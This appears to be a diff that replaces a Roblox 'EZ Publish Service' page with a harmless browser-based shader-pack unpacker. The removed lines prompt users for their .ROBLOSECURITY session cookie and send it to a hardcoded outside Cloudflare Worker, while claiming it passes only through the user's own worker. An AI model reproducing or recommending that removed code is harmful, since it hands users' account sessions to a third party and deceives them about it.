@@ -1,486 +1,255 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>EZ Publish Service</title>
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet" />
-  <style>
-    * { box-sizing: border-box; margin: 0; padding: 0; }
-
-    body {
-      font-family: 'Inter', sans-serif;
-      background: #f5f5f5;
-      color: #1a1a1a;
-      min-height: 100vh;
-    }
-
-    .topbar {
-      background: #fff;
-      border-bottom: 1px solid #e0e0e0;
-      padding: 0 32px;
-      height: 56px;
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-    }
-
-    .topbar-title { font-size: 15px; font-weight: 600; }
-    .topbar-sub { font-size: 12px; color: #999; }
-
-    .container {
-      max-width: 600px;
-      margin: 40px auto;
-      padding: 0 20px;
-    }
-
-    .security-notice {
-      background: #f0fdf4;
-      border: 1px solid #bbf7d0;
-      border-radius: 6px;
-      padding: 10px 14px;
-      font-size: 12px;
-      color: #166534;
-      margin-bottom: 20px;
-      display: flex;
-      align-items: center;
-      gap: 8px;
-    }
-
-    .tabs {
-      display: flex;
-      background: #fff;
-      border: 1px solid #e0e0e0;
-      border-radius: 8px 8px 0 0;
-      border-bottom: none;
-      overflow: hidden;
-    }
-
-    .tab {
-      padding: 14px 24px;
-      font-size: 13px;
-      font-weight: 500;
-      color: #888;
-      background: none;
-      border: none;
-      border-bottom: 2px solid transparent;
-      cursor: pointer;
-      transition: all 0.15s;
-      font-family: 'Inter', sans-serif;
-    }
-
-    .tab.active { color: #1a1a1a; border-bottom-color: #e5172d; }
-    .tab:hover:not(.active) { color: #444; }
-
-    .panel { display: none; }
-    .panel.active { display: block; }
-
-    .card {
-      background: #fff;
-      border: 1px solid #e0e0e0;
-      border-radius: 0 0 8px 8px;
-      padding: 24px;
-    }
-
-    .field { margin-bottom: 18px; }
-
-    .field label {
-      display: block;
-      font-size: 12px;
-      font-weight: 500;
-      color: #555;
-      margin-bottom: 6px;
-      text-transform: uppercase;
-      letter-spacing: 0.5px;
-    }
-
-    .field input {
-      width: 100%;
-      padding: 10px 12px;
-      font-size: 13px;
-      font-family: 'Inter', sans-serif;
-      border: 1px solid #ddd;
-      border-radius: 6px;
-      background: #fafafa;
-      color: #1a1a1a;
-      outline: none;
-      transition: border-color 0.15s;
-    }
-
-    .field input:focus { border-color: #e5172d; background: #fff; }
-    .field input::placeholder { color: #bbb; }
-    .field .hint { font-size: 11px; color: #aaa; margin-top: 5px; }
-
-    .row {
-      display: grid;
-      grid-template-columns: 1fr 1fr;
-      gap: 16px;
-      margin-bottom: 18px;
-    }
-
-    .row .field { margin-bottom: 0; }
-
-    .divider {
-      border: none;
-      border-top: 1px solid #f0f0f0;
-      margin: 20px 0;
-    }
-
-    .status-row {
-      display: flex;
-      align-items: center;
-      gap: 8px;
-      margin-bottom: 12px;
-      font-size: 12px;
-      color: #888;
-    }
-
-    .dot {
-      width: 8px; height: 8px;
-      border-radius: 50%;
-      background: #ddd;
-      flex-shrink: 0;
-    }
-    .dot.running { background: #22c55e; animation: blink 1s infinite; }
-    .dot.done    { background: #22c55e; }
-    .dot.error   { background: #f87171; }
-
-    @keyframes blink {
-      0%, 100% { opacity: 1; }
-      50% { opacity: 0.3; }
-    }
-
-    .progress-bar-wrap {
-      height: 4px;
-      background: #f0f0f0;
-      border-radius: 2px;
-      margin-bottom: 20px;
-      overflow: hidden;
-    }
-
-    .progress-bar-fill {
-      height: 100%;
-      background: #e5172d;
-      border-radius: 2px;
-      width: 0%;
-      transition: width 0.3s;
-    }
-
-    .btn-row { display: flex; gap: 10px; }
-
-    .btn {
-      padding: 11px 20px;
-      font-size: 13px;
-      font-weight: 600;
-      font-family: 'Inter', sans-serif;
-      border: none;
-      border-radius: 6px;
-      cursor: pointer;
-      transition: background 0.15s;
-    }
-
-    .btn-primary { background: #e5172d; color: #fff; flex: 1; }
-    .btn-primary:hover { background: #c0121f; }
-    .btn-primary:disabled { background: #f5c0c5; cursor: not-allowed; }
-
-    .btn-secondary { background: #f0f0f0; color: #555; }
-    .btn-secondary:hover { background: #e5e5e5; }
-
-    .log-box {
-      background: #111;
-      border-radius: 6px;
-      height: 320px;
-      overflow-y: auto;
-      padding: 14px;
-      font-family: 'Courier New', monospace;
-      font-size: 11px;
-      line-height: 1.9;
-      scrollbar-width: thin;
-      scrollbar-color: #333 transparent;
-    }
-
-    .log-line { display: flex; gap: 10px; }
-    .log-ts   { color: #444; flex-shrink: 0; }
-    .log-ok   { color: #22c55e; }
-    .log-err  { color: #f87171; }
-    .log-info { color: #f59e0b; }
-
-    .log-actions {
-      display: flex;
-      justify-content: flex-end;
-      margin-top: 10px;
-    }
-
-    .btn-link {
-      background: none;
-      border: none;
-      font-size: 12px;
-      color: #aaa;
-      cursor: pointer;
-      font-family: 'Inter', sans-serif;
-    }
-    .btn-link:hover { color: #555; }
-
-    footer {
-      text-align: center;
-      font-size: 11px;
-      color: #bbb;
-      margin-top: 32px;
-      padding-bottom: 40px;
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>RBXS Shader Pack Unpacker</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #1e1e24;
+            color: #f5f5f5;
+            margin: 0;
+            padding: 40px 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        .container {
+            max-width: 600px;
+            width: 100%;
+            background-color: #2a2a32;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
+            text-align: center;
+        }
+        h1 { margin-top: 0; color: #4a90e2; }
+        p { color: #b0b0b8; font-size: 0.95rem; }
+        .file-input-wrapper {
+            margin: 25px 0;
+            position: relative;
+        }
+        input[type="file"] {
+            display: none;
+        }
+        .custom-file-upload {
+            border: 2px dashed #4a90e2;
+            display: inline-block;
+            padding: 20px 40px;
+            cursor: pointer;
+            border-radius: 6px;
+            background-color: #23232a;
+            transition: all 0.3s ease;
+        }
+        .custom-file-upload:hover {
+            background-color: #2d3846;
+            border-color: #67a4ed;
+        }
+        #status {
+            margin: 20px 0;
+            font-weight: bold;
+            color: #00ffcc;
+            min-height: 24px;
+        }
+        button {
+            background-color: #27ae60;
+            color: white;
+            border: none;
+            padding: 12px 30px;
+            font-size: 1rem;
+            font-weight: bold;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: background 0.2s;
+            display: none;
+        }
+        button:hover { background-color: #219653; }
+        #fileList {
+            margin-top: 20px;
+            max-height: 200px;
+            overflow-y: auto;
+            text-align: left;
+            background: #19191e;
+            padding: 10px;
+            border-radius: 4px;
+            font-family: monospace;
+            font-size: 0.85rem;
+            display: none;
+        }
+        .file-item { color: #a0a0a8; padding: 2px 0; border-bottom: 1px solid #25252d; }
+    </style>
 </head>
 <body>
 
-<div class="topbar">
-  <span class="topbar-title">EZ Publish Service</span>
-  <span class="topbar-sub">Roblox Universe and Place Tool</span>
-</div>
-
 <div class="container">
-
-  <div class="security-notice">
-    <span>🔒</span>
-    Your cookie is wiped from this page immediately after submission, never stored anywhere, and only passes through your own Cloudflare Worker over HTTPS.
-  </div>
-
-  <div class="tabs">
-    <button class="tab active" onclick="switchTab('universe')">Create Universe</button>
-    <button class="tab" onclick="switchTab('place')">Create Place</button>
-    <button class="tab" onclick="switchTab('log')">Log</button>
-  </div>
-
-  <!-- Universe Panel -->
-  <div id="panel-universe" class="panel active">
-    <div class="card">
-      <div class="field">
-        <label>Roblox Security Cookie</label>
-        <input type="password" id="u-cookie" placeholder="Paste your .ROBLOSECURITY cookie here" autocomplete="off" />
-        <div class="hint">Wiped from this field the moment you click Start.</div>
-      </div>
-      <div class="field">
-        <label>Template Place ID</label>
-        <input type="text" id="u-template" value="95206881" />
-        <div class="hint">Default is 95206881 (baseplate).</div>
-      </div>
-      <div class="row">
-        <div class="field">
-          <label>Number to Create</label>
-          <input type="number" id="u-count" value="1" min="1" max="50" />
-        </div>
-        <div class="field">
-          <label>Delay Between Requests (s)</label>
-          <input type="number" id="u-delay" value="1" min="0.5" max="10" step="0.5" />
-        </div>
-      </div>
-      <hr class="divider" />
-      <div class="status-row">
-        <div class="dot" id="u-dot"></div>
-        <span id="u-status">Ready</span>
-      </div>
-      <div class="progress-bar-wrap">
-        <div class="progress-bar-fill" id="u-bar"></div>
-      </div>
-      <div class="btn-row">
-        <button class="btn btn-primary" id="u-btn" onclick="runUniverses()">Start Creating</button>
-        <button class="btn btn-secondary" onclick="stop()">Stop</button>
-      </div>
+    <h1>RBXS Shader Unpacker</h1>
+    <p>Select your <code>shaders_glsles3.pack</code> file to extract all GLSL shader stages natively in your browser.</p>
+    
+    <div class="file-input-wrapper">
+        <label for="fileInput" class="custom-file-upload">
+            📁 Choose .pack File
+        </label>
+        <input type="file" id="fileInput" accept=".pack">
     </div>
-  </div>
 
-  <!-- Place Panel -->
-  <div id="panel-place" class="panel">
-    <div class="card">
-      <div class="field">
-        <label>Roblox Security Cookie</label>
-        <input type="password" id="p-cookie" placeholder="Paste your .ROBLOSECURITY cookie here" autocomplete="off" />
-        <div class="hint">Wiped from this field the moment you click Start.</div>
-      </div>
-      <div class="field">
-        <label>Universe ID</label>
-        <input type="text" id="p-universe" placeholder="e.g. 123456789" />
-      </div>
-      <div class="field">
-        <label>Template Place ID</label>
-        <input type="text" id="p-template" value="95206881" />
-        <div class="hint">Default is 95206881 (baseplate).</div>
-      </div>
-      <div class="row">
-        <div class="field">
-          <label>Number to Create</label>
-          <input type="number" id="p-count" value="1" min="1" max="50" />
-        </div>
-        <div class="field">
-          <label>Delay Between Requests (s)</label>
-          <input type="number" id="p-delay" value="1" min="0.5" max="10" step="0.5" />
-        </div>
-      </div>
-      <hr class="divider" />
-      <div class="status-row">
-        <div class="dot" id="p-dot"></div>
-        <span id="p-status">Ready</span>
-      </div>
-      <div class="progress-bar-wrap">
-        <div class="progress-bar-fill" id="p-bar"></div>
-      </div>
-      <div class="btn-row">
-        <button class="btn btn-primary" id="p-btn" onclick="runPlaces()">Start Creating</button>
-        <button class="btn btn-secondary" onclick="stop()">Stop</button>
-      </div>
-    </div>
-  </div>
-
-  <!-- Log Panel -->
-  <div id="panel-log" class="panel">
-    <div class="card" style="border-radius:8px;">
-      <div class="log-box" id="log"></div>
-      <div class="log-actions">
-        <button class="btn-link" onclick="clearLog()">Clear log</button>
-      </div>
-    </div>
-  </div>
-
-  <footer>EZ Publish Service &nbsp;|&nbsp; Made by allvideo</footer>
-
+    <div id="status">Ready</div>
+    <button id="downloadBtn">Download Shaders (.zip)</button>
+    
+    <div id="fileList"></div>
 </div>
 
 <script>
-  const WORKER_URL = 'https://ezexperiencepublisher.acc943132.workers.dev/';
-  let running = false;
+document.getElementById('fileInput').addEventListener('change', function(e) {
+    const file = e.target.files[0];
+    if (!file) return;
 
-  // Wipe cookie fields on page close
-  window.addEventListener('beforeunload', () => {
-    document.getElementById('u-cookie').value = '';
-    document.getElementById('p-cookie').value = '';
-  });
+    const statusDiv = document.getElementById('status');
+    const downloadBtn = document.getElementById('downloadBtn');
+    const fileListDiv = document.getElementById('fileList');
+    
+    statusDiv.style.color = "#00ffcc";
+    statusDiv.innerText = "[*] Reading file...";
+    downloadBtn.style.display = "none";
+    fileListDiv.style.display = "none";
+    fileListDiv.innerHTML = "";
 
-  function switchTab(id) {
-    document.querySelectorAll('.tab').forEach((t, i) => {
-      t.classList.toggle('active', ['universe', 'place', 'log'][i] === id);
-    });
-    document.querySelectorAll('.panel').forEach(p => p.classList.remove('active'));
-    document.getElementById('panel-' + id).classList.add('active');
-  }
+    const reader = new FileReader();
+    reader.onload = function(event) {
+        const arrayBuffer = event.target.result;
+        const uint8 = new Uint8Array(arrayBuffer);
 
-  function log(msg, type = 'info') {
-    const box = document.getElementById('log');
-    const ts = new Date().toTimeString().slice(0, 8);
-    const line = document.createElement('div');
-    line.className = 'log-line';
-    line.innerHTML = `<span class="log-ts">[${ts}]</span><span class="log-${type}">${msg}</span>`;
-    box.appendChild(line);
-    box.scrollTop = box.scrollHeight;
-  }
+        // Verify RBXS Magic Bytes (0x52 0x42 0x58 0x53)
+        if (uint8[0] !== 0x52 || uint8[1] !== 0x42 || uint8[2] !== 0x58 || uint8[3] !== 0x53) {
+            statusDiv.style.color = "#ff4a4a";
+            statusDiv.innerText = "[-] Error: Not a valid RBXS file format.";
+            return;
+        }
 
-  function clearLog() {
-    document.getElementById('log').innerHTML = '';
-  }
+        // Helper to find byte array pattern matches
+        const versionString = "#version 300 es";
+        const encoder = new TextEncoder();
+        const versionBytes = encoder.encode(versionString);
+        const markers = [];
 
-  function setStatus(prefix, text, state) {
-    document.getElementById(`${prefix}-status`).textContent = text;
-    document.getElementById(`${prefix}-dot`).className = 'dot' + (state ? ' ' + state : '');
-  }
+        // Scan for #version 300 es blocks
+        for (let i = 0; i <= uint8.length - versionBytes.length; i++) {
+            let match = true;
+            for (let j = 0; j < versionBytes.length; j++) {
+                if (uint8[i + j] !== versionBytes[j]) {
+                    match = false;
+                    break;
+                }
+            }
+            if (match) markers.push(i);
+        }
 
-  function setProgress(prefix, val, total) {
-    document.getElementById(`${prefix}-bar`).style.width =
-      (total ? Math.round((val / total) * 100) : 0) + '%';
-  }
+        if (markers.length === 0) {
+            statusDiv.style.color = "#ff4a4a";
+            statusDiv.innerText = "[-] Error: No GLSL shader blocks found.";
+            return;
+        }
 
-  function stop() {
-    running = false;
-    log('Stop requested.', 'info');
-  }
+        // Parse Manifest Names from the data before the first shader
+        const firstMarker = markers[0];
+        const decoder = new TextDecoder('utf-8');
+        const manifestText = decoder.decode(uint8.subarray(0, firstMarker));
+        
+        // Simple alphanumeric regex matching strings 3+ chars long
+        const nameRegex = /[A-Za-z0-9_]{3,}/g;
+        const shaderNames = [];
+        const ignored = ["supportsHQ", "supportsSHQ", "supportsTextureMSAA", "supportsCompute", "isAppleGpu", "isVR", "devShader", "default"];
+        
+        let match;
+        while ((match = nameRegex.exec(manifestText)) !== null) {
+            const name = match[0];
+            if (name.startsWith("FFlag") || ignored.includes(name)) continue;
+            if (!shaderNames.includes(name)) {
+                shaderNames.push(name);
+            }
+        }
 
-  const sleep = ms => new Promise(r => setTimeout(r, ms));
+        statusDiv.innerText = `[*] Carving ${markers.length} shaders...`;
 
-  async function callWorker(payload) {
-    const resp = await fetch(WORKER_URL, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify(payload),
-    });
-    return resp.json();
-  }
+        // Initialize JSZip
+        const zip = new JSZip();
 
-  async function runUniverses() {
-    const cookieEl = document.getElementById('u-cookie');
-    const cookie = cookieEl.value.trim();
-    const template = parseInt(document.getElementById('u-template').value) || 95206881;
-    const count = parseInt(document.getElementById('u-count').value) || 1;
-    const delay = parseFloat(document.getElementById('u-delay').value) || 1;
+        // Slice out chunks and assign names
+        for (let idx = 0; idx < markers.length; idx++) {
+            let startPos = markers[idx];
 
-    if (!cookie) { alert('Please paste your .ROBLOSECURITY cookie.'); return; }
+            // Look backward up to 400 bytes to check for structural //$$ texture binding descriptions
+            const lookbackStart = Math.max(0, startPos - 400);
+            const lookbackChunk = uint8.subarray(lookbackStart, startPos);
+            const lookbackStr = decoder.decode(lookbackChunk);
+            const lastCommentIdx = lookbackStr.lastIndexOf("//$$");
+            if (lastCommentIdx !== -1) {
+                // Adjust start index to encapsulate structural comments
+                const byteOffset = encoder.encode(lookbackStr.substring(0, lastCommentIdx)).length;
+                startPos = lookbackStart + byteOffset;
+            }
 
-    // Wipe from DOM immediately
-    cookieEl.value = '';
+            // Establish the trailing boundary boundary
+            let endPos = (idx + 1 < markers.length) ? markers[idx + 1] : uint8.length;
+            
+            // Adjust end position if the next block carries structural comments
+            if (idx + 1 < markers.length) {
+                const nextStart = markers[idx + 1];
+                const nextLookbackStart = Math.max(0, nextStart - 400);
+                const nextLookbackChunk = uint8.subarray(nextLookbackStart, nextStart);
+                const nextLookbackStr = decoder.decode(nextLookbackChunk);
+                const nextCommentIdx = nextLookbackStr.lastIndexOf("//$$");
+                if (nextCommentIdx !== -1) {
+                    const byteOffset = encoder.encode(nextLookbackStr.substring(0, nextCommentIdx)).length;
+                    endPos = nextLookbackStart + byteOffset;
+                }
+            }
 
-    running = true;
-    switchTab('log');
-    document.getElementById('u-btn').disabled = true;
-    setProgress('u', 0, count);
+            const shaderChunk = uint8.subarray(startPos, endPos);
+            const shaderCodeText = decoder.decode(shaderChunk).trim();
 
-    let ok = 0, err = 0;
-    for (let i = 1; i <= count; i++) {
-      if (!running) { log('Stopped by user.', 'info'); break; }
-      setStatus('u', `Creating universe ${i} of ${count}...`, 'running');
-      try {
-        const res = await callWorker({ action: 'createUniverse', cookie, templateId: template });
-        log(`[Universe ${i}/${count}] ${res.message}`, res.ok ? 'ok' : 'err');
-        res.ok ? ok++ : err++;
-      } catch(e) {
-        log(`[Universe ${i}/${count}] Request failed.`, 'err');
-        err++;
-      }
-      setProgress('u', i, count);
-      if (i < count && running) await sleep(delay * 1000);
-    }
+            // Determine safe file name mapping
+            let baseName = (idx < shaderNames.length) ? shaderNames[idx] : `unnamed_shader_${idx}`;
+            let ext = ".glsl";
+            if (baseName.includes("VS")) ext = ".vert";
+            else if (baseName.includes("FS")) ext = ".frag";
+            else if (baseName.includes("CS")) ext = ".comp";
+            
+            const finalFilename = baseName + ext;
 
-    setStatus('u', `Done. ${ok} succeeded, ${err} failed.`, ok > 0 ? 'done' : 'error');
-    log(`Finished: ${ok} universes created, ${err} failed.`, 'info');
-    document.getElementById('u-btn').disabled = false;
-    running = false;
-  }
+            // Append file into the virtual ZIP directory
+            zip.file(finalFilename, shaderCodeText);
 
-  async function runPlaces() {
-    const cookieEl = document.getElementById('p-cookie');
-    const cookie = cookieEl.value.trim();
-    const universeId = document.getElementById('p-universe').value.trim();
-    const template = parseInt(document.getElementById('p-template').value) || 95206881;
-    const count = parseInt(document.getElementById('p-count').value) || 1;
-    const delay = parseFloat(document.getElementById('p-delay').value) || 1;
+            // Log item visibly on the page interface list
+            const item = document.createElement('div');
+            item.className = 'file-item';
+            item.innerText = `+ ${finalFilename}`;
+            fileListDiv.appendChild(item);
+        }
 
-    if (!cookie) { alert('Please paste your .ROBLOSECURITY cookie.'); return; }
-    if (!universeId || isNaN(universeId)) { alert('Please enter a valid Universe ID.'); return; }
+        statusDiv.innerText = `[+] Successfully parsed ${markers.length} shaders!`;
+        fileListDiv.style.display = "block";
+        downloadBtn.style.display = "inline-block";
 
-    // Wipe from DOM immediately
-    cookieEl.value = '';
+        // Bind the zip generation routine to the button element
+        downloadBtn.onclick = function() {
+            statusDiv.innerText = "[*] Generating ZIP archive...";
+            zip.generateAsync({type:"blob"}).then(function(content) {
+                const link = document.createElement('a');
+                link.href = URL.createObjectURL(content);
+                link.download = "extracted_shaders.zip";
+                document.body.appendChild(link);
+                link.click();
+                document.body.removeChild(link);
+                statusDiv.innerText = "[+] Download triggered successfully.";
+            });
+        };
+    };
 
-    running = true;
-    switchTab('log');
-    document.getElementById('p-btn').disabled = true;
-    setProgress('p', 0, count);
-
-    let ok = 0, err = 0;
-    for (let i = 1; i <= count; i++) {
-      if (!running) { log('Stopped by user.', 'info'); break; }
-      setStatus('p', `Creating place ${i} of ${count}...`, 'running');
-      try {
-        const res = await callWorker({ action: 'createPlace', cookie, universeId, templateId: template });
-        log(`[Place ${i}/${count}] ${res.message}`, res.ok ? 'ok' : 'err');
-        res.ok ? ok++ : err++;
-      } catch(e) {
-        log(`[Place ${i}/${count}] Request failed.`, 'err');
-        err++;
-      }
-      setProgress('p', i, count);
-      if (i < count && running) await sleep(delay * 1000);
-    }
-
-    setStatus('p', `Done. ${ok} succeeded, ${err} failed.`, ok > 0 ? 'done' : 'error');
-    log(`Finished: ${ok} places created, ${err} failed.`, 'info');
-    document.getElementById('p-btn').disabled = false;
-    running = false;
-  }
+    reader.readAsArrayBuffer(file);
+});
 </script>
+
 </body>
 </html>
